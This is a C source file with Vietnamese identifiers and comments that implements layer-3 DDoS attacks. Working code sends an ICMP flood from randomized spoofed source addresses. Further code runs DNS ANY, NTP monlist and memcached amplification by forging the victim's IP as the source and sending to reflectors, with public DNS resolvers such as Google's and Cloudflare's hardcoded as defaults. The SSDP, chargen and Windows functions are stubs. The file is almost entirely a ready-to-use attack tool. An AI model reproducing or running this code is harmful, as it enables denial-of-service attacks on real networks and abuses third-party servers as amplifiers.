/**
 * ddos_layer3.c
 * Trien khai cac ham DDoS Layer 3 (ICMP, Amplification)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #define THREAD_HANDLE HANDLE
    #define THREAD_RETURN DWORD WINAPI
    #define THREAD_PARAM LPVOID
    #define SLEEP_MS(x) Sleep(x)
    #define CLOSE_SOCKET closesocket
    #define THREAD_CREATE(h, f, p) *h = CreateThread(NULL, 0, f, p, 0, NULL)
    #define THREAD_JOIN(h) WaitForSingleObject(h, INFINITE)
    #define THREAD_EXIT return 0
    #define KHONG_HO_TRO_RAW_SOCKET 1
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <unistd.h>
    #include <pthread.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <netinet/ip_icmp.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <errno.h>
    #define THREAD_HANDLE pthread_t
    #define THREAD_RETURN void*
    #define THREAD_PARAM void*
    #define SLEEP_MS(x) usleep((x) * 1000)
    #define CLOSE_SOCKET close
    #define THREAD_CREATE(h, f, p) pthread_create(h, NULL, f, p)
    #define THREAD_JOIN(h) pthread_join(h, NULL)
    #define THREAD_EXIT return NULL
#endif

#include "ddos_layer3.h"

/* Cau truc tham so cho thread */
typedef struct {
    char ip_muc_tieu[64];
    int kich_thuoc_goi;
    int thoi_gian;
    volatile int* dem_goi;
    volatile int* dang_chay;
    const char** danh_sach_may_chu;
    int so_may_chu;
} ThamSoThreadL3;

/* Danh sach DNS resolver cong cong */
static const char* DNS_RESOLVERS[] = {
    "8.8.8.8",          /* Google */
    "8.8.4.4",          /* Google */
    "1.1.1.1",          /* Cloudflare */
    "1.0.0.1",          /* Cloudflare */
    "9.9.9.9",          /* Quad9 */
    "208.67.222.222",   /* OpenDNS */
    "208.67.220.220",   /* OpenDNS */
    "64.6.64.6",        /* Verisign */
    "64.6.65.6",        /* Verisign */
    "84.200.69.80",     /* DNS.WATCH */
    NULL
};

/* DNS query mau cho ANY request */
static const unsigned char DNS_ANY_QUERY[] = {
    0x00, 0x01, /* Transaction ID */
    0x01, 0x00, /* Flags: standard query */
    0x00, 0x01, /* Questions: 1 */
    0x00, 0x00, /* Answer RRs */
    0x00, 0x00, /* Authority RRs */
    0x00, 0x00, /* Additional RRs */
    /* Query: "google.com" */
    0x06, 'g', 'o', 'o', 'g', 'l', 'e',
    0x03, 'c', 'o', 'm',
    0x00,       /* End of name */
    0x00, 0xFF, /* Type: ANY */
    0x00, 0x01  /* Class: IN */
};
#define DNS_ANY_QUERY_SIZE (sizeof(DNS_ANY_QUERY))

/* NTP monlist request */
static const unsigned char NTP_MONLIST[] = {
    0x17, 0x00, 0x03, 0x2a, /* Flags: version 2, mode 7 (monlist) */
    0x00, 0x00, 0x00, 0x00, /* Request ID */
    0x00, 0x00, 0x00, 0x00, /* Remaining fields */
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
};
#define NTP_MONLIST_SIZE (sizeof(NTP_MONLIST))

#ifndef KHONG_HO_TRO_RAW_SOCKET
/* ==================== LINUX LAYER 3 ==================== */

/**
 * Tinh checksum ICMP
 */
static uint16_t tinh_checksum_icmp(void* data, size_t length) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;
    
    while (length > 1) {
        sum += *ptr++;
        length -= 2;
    }
    
    if (length > 0) {
        sum += *(uint8_t*)ptr;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return (uint16_t)(~sum);
}

/**
 * Tao IP nguon ngau nhien (dung trong amplification)
 */
static uint32_t tao_ip_ngau_nhien_amp(void) {
    uint8_t byte1 = (rand() % 223) + 1;
    if (byte1 == 10 || byte1 == 127) byte1 = 11;
    if (byte1 == 172 && ((rand() % 256) >= 16 && (rand() % 256) <= 31)) byte1 = 173;
    if (byte1 >= 224) byte1 = 223;
    
    uint8_t byte2 = rand() % 256;
    uint8_t byte3 = rand() % 256;
    uint8_t byte4 = (rand() % 254) + 1;
    
    return (byte1 << 24) | (byte2 << 16) | (byte3 << 8) | byte4;
}

/**
 * ICMP Flood thread
 */
static THREAD_RETURN thread_icmp_flood(THREAD_PARAM param) {
    ThamSoThreadL3* ts = (ThamSoThreadL3*)param;
    
    /* Tao raw socket */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) THREAD_EXIT;
    
    /* Bat IP_HDRINCL */
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, ts->ip_muc_tieu, &dest_addr.sin_addr);
    
    /* Chuan bi goi tin ICMP */
    int packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + ts->kich_thuoc_goi;
    if (packet_size > 65535) packet_size = 65535;
    if (ts->kich_thuoc_goi < 0) packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + 56;
    
    char* packet = (char*)malloc(packet_size);
    if (packet == NULL) {
        CLOSE_SOCKET(sock);
        THREAD_EXIT;
    }
    memset(packet, 0, packet_size);
    
    struct iphdr* ip = (struct iphdr*)packet;
    struct icmphdr* icmp = (struct icmphdr*)(packet + sizeof(struct iphdr));
    
    /* Cau hinh IP header */
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_size);
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = 0; /* Se duoc cap nhat trong vong lap */
    ip->daddr = dest_addr.sin_addr.s_addr;
    
    /* Cau hinh ICMP header */
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(rand() % 65535);
    icmp->un.echo.sequence = htons(1);
    
    /* Dien du lieu */
    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), 'A', ts->kich_thuoc_goi);
    
    time_t thoi_gian_bat_dau = time(NULL);
    int seq = 1;
    
    while (*(ts->dang_chay)) {
        if (ts->thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= ts->thoi_gian) break;
        
        ip->saddr = tao_ip_ngau_nhien_amp();
        ip->id = htons(rand() % 65535);
        icmp->un.echo.sequence = htons(seq++);
        icmp->checksum = 0;
        icmp->checksum = tinh_checksum_icmp(icmp, sizeof(struct icmphdr) + ts->kich_thuoc_goi);
        
        ip->check = 0;
        ip->check = tinh_checksum_icmp(ip, sizeof(struct iphdr));
        
        sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        (*(ts->dem_goi))++;
        
        if (*(ts->dem_goi) % 1000 == 0) {
            SLEEP_MS(1);
        }
    }
    
    free(packet);
    CLOSE_SOCKET(sock);
    THREAD_EXIT;
}

int icmp_flood(const char* ip_muc_tieu, int kich_thuoc_goi, int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    ThamSoThreadL3 ts;
    strncpy(ts.ip_muc_tieu, ip_muc_tieu, sizeof(ts.ip_muc_tieu) - 1);
    ts.kich_thuoc_goi = kich_thuoc_goi;
    ts.thoi_gian = thoi_gian;
    ts.dem_goi = &dem_goi;
    ts.dang_chay = &dang_chay;
    
    pthread_t* threads = (pthread_t*)malloc(sizeof(pthread_t) * so_thread);
    if (threads == NULL) return 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_create(&threads[i], NULL, thread_icmp_flood, &ts);
    }
    
    if (thoi_gian > 0) {
        sleep(thoi_gian);
    } else {
        sleep(30);
    }
    
    dang_chay = 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    return dem_goi;
}

/**
 * DNS Amplification thread
 */
static THREAD_RETURN thread_dns_amp(THREAD_PARAM param) {
    ThamSoThreadL3* ts = (ThamSoThreadL3*)param;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) THREAD_EXIT;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    /* Chuan bi goi tin */
    int packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + DNS_ANY_QUERY_SIZE;
    char* packet = (char*)malloc(packet_size);
    if (packet == NULL) {
        CLOSE_SOCKET(sock);
        THREAD_EXIT;
    }
    memset(packet, 0, packet_size);
    
    struct iphdr* ip = (struct iphdr*)packet;
    struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
    
    /* Cau hinh IP header */
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_size);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    
    /* Copy DNS query */
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), 
           DNS_ANY_QUERY, DNS_ANY_QUERY_SIZE);
    
    time_t thoi_gian_bat_dau = time(NULL);
    int resolver_idx = 0;
    
    while (*(ts->dang_chay)) {
        if (ts->thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= ts->thoi_gian) break;
        
        /* Chon resolver tiep theo */
        const char* resolver_ip = ts->danh_sach_may_chu[resolver_idx % ts->so_may_chu];
        resolver_idx++;
        
        /* Cau hinh IP nguon = nan nhan, IP dich = resolver */
        inet_pton(AF_INET, ts->ip_muc_tieu, &ip->saddr); /* Gia mao IP nguon */
        inet_pton(AF_INET, resolver_ip, &ip->daddr);     /* Gui den resolver */
        ip->id = htons(rand() % 65535);
        ip->check = 0;
        ip->check = tinh_checksum_icmp(ip, sizeof(struct iphdr));
        
        /* Cau hinh UDP */
        udp->source = htons(rand() % 65535 + 1);
        udp->dest = htons(53); /* DNS port */
        udp->len = htons(sizeof(struct udphdr) + DNS_ANY_QUERY_SIZE);
        udp->check = 0; /* Checksum khong bat buoc cho UDP */
        
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        inet_pton(AF_INET, resolver_ip, &dest_addr.sin_addr);
        
        sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        (*(ts->dem_goi))++;
    }
    
    free(packet);
    CLOSE_SOCKET(sock);
    THREAD_EXIT;
}

int dns_amplification(const char* ip_muc_tieu, const char** danh_sach_resolver,
                      int so_resolver, int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    ThamSoThreadL3 ts;
    strncpy(ts.ip_muc_tieu, ip_muc_tieu, sizeof(ts.ip_muc_tieu) - 1);
    ts.thoi_gian = thoi_gian;
    ts.dem_goi = &dem_goi;
    ts.dang_chay = &dang_chay;
    
    /* Su dung resolver mac dinh neu khong co */
    if (danh_sach_resolver == NULL || so_resolver == 0) {
        ts.danh_sach_may_chu = DNS_RESOLVERS;
        ts.so_may_chu = 0;
        while (DNS_RESOLVERS[ts.so_may_chu] != NULL) ts.so_may_chu++;
    } else {
        ts.danh_sach_may_chu = danh_sach_resolver;
        ts.so_may_chu = so_resolver;
    }
    
    pthread_t* threads = (pthread_t*)malloc(sizeof(pthread_t) * so_thread);
    if (threads == NULL) return 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_create(&threads[i], NULL, thread_dns_amp, &ts);
    }
    
    if (thoi_gian > 0) {
        sleep(thoi_gian);
    } else {
        sleep(30);
    }
    
    dang_chay = 0;
    
    for (int i = 0; i < so_thread; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    return dem_goi;
}

/**
 * NTP Amplification
 */
int ntp_amplification(const char* ip_muc_tieu, const char** danh_sach_ntp,
                      int so_ntp, int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return 0;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    int packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + NTP_MONLIST_SIZE;
    char* packet = (char*)malloc(packet_size);
    if (packet == NULL) {
        CLOSE_SOCKET(sock);
        return 0;
    }
    memset(packet, 0, packet_size);
    
    struct iphdr* ip = (struct iphdr*)packet;
    struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
    
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_size);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    
    /* Copy NTP monlist payload */
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), NTP_MONLIST, NTP_MONLIST_SIZE);
    
    time_t thoi_gian_bat_dau = time(NULL);
    int ntp_idx = 0;
    
    while (dang_chay) {
        if (thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= thoi_gian) break;
        
        if (danh_sach_ntp != NULL && so_ntp > 0) {
            const char* ntp_ip = danh_sach_ntp[ntp_idx % so_ntp];
            ntp_idx++;
            
            inet_pton(AF_INET, ip_muc_tieu, &ip->saddr);
            inet_pton(AF_INET, ntp_ip, &ip->daddr);
            ip->id = htons(rand() % 65535);
            ip->check = 0;
            ip->check = tinh_checksum_icmp(ip, sizeof(struct iphdr));
            
            udp->source = htons(rand() % 65535 + 1);
            udp->dest = htons(123);
            udp->len = htons(sizeof(struct udphdr) + NTP_MONLIST_SIZE);
            udp->check = 0;
            
            struct sockaddr_in dest_addr;
            dest_addr.sin_family = AF_INET;
            inet_pton(AF_INET, ntp_ip, &dest_addr.sin_addr);
            
            sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            dem_goi++;
        }
    }
    
    free(packet);
    CLOSE_SOCKET(sock);
    return dem_goi;
}

int memcached_amplification(const char* ip_muc_tieu, const char** danh_sach_memcached,
                            int so_memcached, int so_thread, int thoi_gian) {
    volatile int dem_goi = 0;
    volatile int dang_chay = 1;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return 0;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    /* Memcached stats command */
    const char* stats_cmd = "stats\r\n";
    size_t cmd_len = strlen(stats_cmd);
    
    int packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + cmd_len;
    char* packet = (char*)malloc(packet_size);
    if (packet == NULL) {
        CLOSE_SOCKET(sock);
        return 0;
    }
    memset(packet, 0, packet_size);
    
    struct iphdr* ip = (struct iphdr*)packet;
    struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
    
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_size);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), stats_cmd, cmd_len);
    
    time_t thoi_gian_bat_dau = time(NULL);
    int mem_idx = 0;
    
    while (dang_chay) {
        if (thoi_gian > 0 && (time(NULL) - thoi_gian_bat_dau) >= thoi_gian) break;
        
        if (danh_sach_memcached != NULL && so_memcached > 0) {
            const char* mem_ip = danh_sach_memcached[mem_idx % so_memcached];
            mem_idx++;
            
            inet_pton(AF_INET, ip_muc_tieu, &ip->saddr);
            inet_pton(AF_INET, mem_ip, &ip->daddr);
            ip->id = htons(rand() % 65535);
            ip->check = 0;
            ip->check = tinh_checksum_icmp(ip, sizeof(struct iphdr));
            
            udp->source = htons(rand() % 65535 + 1);
            udp->dest = htons(11211);
            udp->len = htons(sizeof(struct udphdr) + cmd_len);
            udp->check = 0;
            
            struct sockaddr_in dest_addr;
            dest_addr.sin_family = AF_INET;
            inet_pton(AF_INET, mem_ip, &dest_addr.sin_addr);
            
            sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            dem_goi++;
        }
    }
    
    free(packet);
    CLOSE_SOCKET(sock);
    return dem_goi;
}

int ssdp_amplification(const char* ip_muc_tieu, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)so_thread; (void)thoi_gian;
    return 0;
}

int chargen_amplification(const char* ip_muc_tieu, const char** danh_sach_chargen,
                          int so_chargen, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)danh_sach_chargen; (void)so_chargen; 
    (void)so_thread; (void)thoi_gian;
    return 0;
}

#else
/* ==================== WINDOWS STUB ==================== */

int icmp_flood(const char* ip_muc_tieu, int kich_thuoc_goi, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)kich_thuoc_goi; (void)so_thread; (void)thoi_gian;
    return 0;
}

int dns_amplification(const char* ip_muc_tieu, const char** danh_sach_resolver,
                      int so_resolver, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)danh_sach_resolver; (void)so_resolver; 
    (void)so_thread; (void)thoi_gian;
    return 0;
}

int ntp_amplification(const char* ip_muc_tieu, const char** danh_sach_ntp,
                      int so_ntp, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)danh_sach_ntp; (void)so_ntp; 
    (void)so_thread; (void)thoi_gian;
    return 0;
}

int memcached_amplification(const char* ip_muc_tieu, const char** danh_sach_memcached,
                            int so_memcached, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)danh_sach_memcached; (void)so_memcached;
    (void)so_thread; (void)thoi_gian;
    return 0;
}

int ssdp_amplification(const char* ip_muc_tieu, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)so_thread; (void)thoi_gian;
    return 0;
}

int chargen_amplification(const char* ip_muc_tieu, const char** danh_sach_chargen,
                          int so_chargen, int so_thread, int thoi_gian) {
    (void)ip_muc_tieu; (void)danh_sach_chargen; (void)so_chargen;
    (void)so_thread; (void)thoi_gian;
    return 0;
}

#endif /* KHONG_HO_TRO_RAW_SOCKET */